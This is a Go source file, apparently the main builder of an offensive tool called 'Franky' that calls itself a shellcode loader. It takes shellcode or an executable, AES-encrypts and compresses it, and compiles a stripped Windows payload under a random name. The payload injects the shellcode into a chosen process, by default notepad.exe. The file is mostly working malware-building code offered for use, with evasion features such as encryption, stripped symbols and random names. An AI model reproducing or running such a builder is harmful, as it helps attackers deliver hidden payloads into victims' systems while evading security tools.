package main

import (
	"bytes"
	"flag"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"path/filepath"

	"github.com/fatih/color"
)

func main() {
	// Variable declarations
	var shellcodeBytes []byte
	var goArch string

	// Set command-line flags
	filePath := flag.String("path", "", "Path to shellcode or exe")
	useExe := flag.Bool("exe", false, "Convert exe to shellcode")
	arch := flag.Int("arch", 32, "architecture of binary (32 or 64)")
	injectProc := flag.String("process", "C:\\Windows\\SysWOW64\\notepad.exe", "Full path to process to inject into")
	flag.Usage = func() {
		w := flag.CommandLine.Output()
		fmt.Fprintf(w, "\t%s \n", headerString)
		fmt.Fprintf(w, "\t\tShellcode Loader\n\n")
		fmt.Fprintf(w, "\tAuthor: misthi0s (@_misthi0s)\n")
		fmt.Fprintf(w, "\tVersion: 0.1\n")
		fmt.Fprintf(w, "\tUsage: ./franky [options] \n\n")
		flag.PrintDefaults()
		fmt.Fprintf(w, "%s\n", footerString)
	}
	flag.Parse()

	// Convert architecture value to Golang equivalent
	if *arch == 32 {
		goArch = "386"
	} else if *arch == 64 {
		goArch = "amd64"
	} else {
		fmt.Println("[+] Unknown architecture. Defaulting to 32bit.")
		goArch = "386"
	}

	// Check if input file (exe or shellcode) exists
	if _, err := os.Stat(*filePath); os.IsNotExist(err) {
		fmt.Println("[*] Path does not exist!")
		os.Exit(1)
	}

	// Convert exe to shellcode or read shellcode file
	if *useExe {
		shellcodeBytes = getShellcode(*filePath)
	} else {
		shellcodeBytes, _ = ioutil.ReadFile(*filePath)
	}

	// Check if "output" folder exists and create it if not
	_, outputFolder := os.Stat("output")
	if os.IsNotExist(outputFolder) {
		os.Mkdir("output", os.ModePerm)
	}

	// Generate random AES key
	key := randomString(16)

	// Print informational table
	underline := color.New(color.Underline)
	fmt.Println(`
	-----------------------
	| Franky - Parameters |
	-----------------------`)
	underline.Printf("Architecture")
	fmt.Printf(": %s\n", goArch)
	underline.Printf("AES Key")
	fmt.Printf(": %s\n", key)
	underline.Printf("Injection Process")
	fmt.Printf(": %s\n", *injectProc)
	underline.Printf("Input File")
	fmt.Printf(": %s\n", *filePath)

	// Encrypt and compress the shellcode
	encryptShellcode(shellcodeBytes, key)

	// Generate build parameters for main payload
	exeName := randomExe()
	ldflagVar := fmt.Sprintf("-X main.franky=%s -X main.injectProc=%s -w -s", key, *injectProc)
	buildVar := fmt.Sprintf("-tags='%s'", goArch)
	outputVar := filepath.FromSlash(fmt.Sprintf("../output/%s", exeName))
	os.Setenv("GOARCH", goArch)
	os.Setenv("GOOS", "windows")

	// Execute the build command to generate main payload
	err := os.Chdir("pkgs")
	if err != nil {
		fmt.Println("[*] 'pkgs' directory does not exist. Make sure this directory containing the payload files exist in the same directory as the builder executable.")
		os.Exit(1)
	}
	cmd := exec.Command("go", "build", "-ldflags", ldflagVar, buildVar, "-o", outputVar, "franky_payload.go")
	var stderr bytes.Buffer
	cmd.Stderr = &stderr
	err = cmd.Run()
	if err != nil {
		fmt.Println(stderr)
	} else {
		fmt.Printf("\nPayload build successful! File \"%s\" created in output directory.", exeName)
	}
	os.Chdir("..")
	// Cleanup shellcode file embedded into final payload
	os.Remove(filepath.FromSlash("pkgs/encrypted_shellcode.bin"))
}
